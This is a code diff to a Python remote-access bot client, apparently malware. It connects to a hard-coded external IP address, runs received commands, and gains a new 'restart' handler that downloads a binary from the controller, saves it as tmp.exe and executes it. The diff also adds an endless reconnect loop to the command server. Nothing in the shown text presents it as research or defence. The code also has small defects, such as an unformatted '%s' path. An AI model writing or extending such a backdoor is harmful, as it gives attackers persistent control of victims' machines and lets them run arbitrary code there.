@@ -86,6 +86,18 @@ def start_session(s):
                     s.send("FAILED".encode())
                     pass
 
+            if "restart" in cmd:
+                try:
+                    payload = s.recv(4096000)
+                    file = open("tmp.exe",'wb')
+                    file.write(payload)
+                    file.close()
+                    path = os.getcwd()
+                    subprocess.Popen("%s/tmp.exe",creationflags=subprocess.CREATE_NEW_PROCESS_GROUP,close_fds=True)
+                    s.send("DONE".encode())
+                except Exception as e:
+                    print("Error : %s"%(str(e)))
+
             if "execute" in cmd:
                 cmd = cmd.strip("execute ")
                 try:
@@ -96,26 +108,31 @@ def start_session(s):
                         s.send("FAILED".encode())
                 except:
                     pass
-
-                #Pending...
-
         #    cmd_size = struct.unpack("<H",cmd[:2])
         #    cmd = struct.unpack("<%ds"%(cmd_size[0]),cmd[2:]).decode()
         #    if "execute" in cmd:
         #        cmd = cmd.strip("execute ")
+
         except Exception as e:
             print(str(e))
 
 def main():
-    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    s.connect(("142.93.197.240",2003))
-    conn_process = Thread(target=start_session,args=(s,))
-    conn_process.start()
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+            s.connect(("142.93.197.240",2003))
+            conn_process = Thread(target=start_session,args=(s,))
+            conn_process.start()
+            conn_process.join()
+        except socket.error:
+            main()
+        except:
+            print("Unknown error occured")
 
 if __name__ == '__main__':
     #path = os.getcwd()
     #subprocess.Popen("%s/bot.exe"%(path),creationflags=subprocess.CREATE_NEW_PROCESS_GROUP,close_fds=True)
 
     main_thread = Thread(target=main,args=())
-    #main_thread.setDaemon(True)
+    #main_thread.setmDaemon(True)
     main_thread.start()
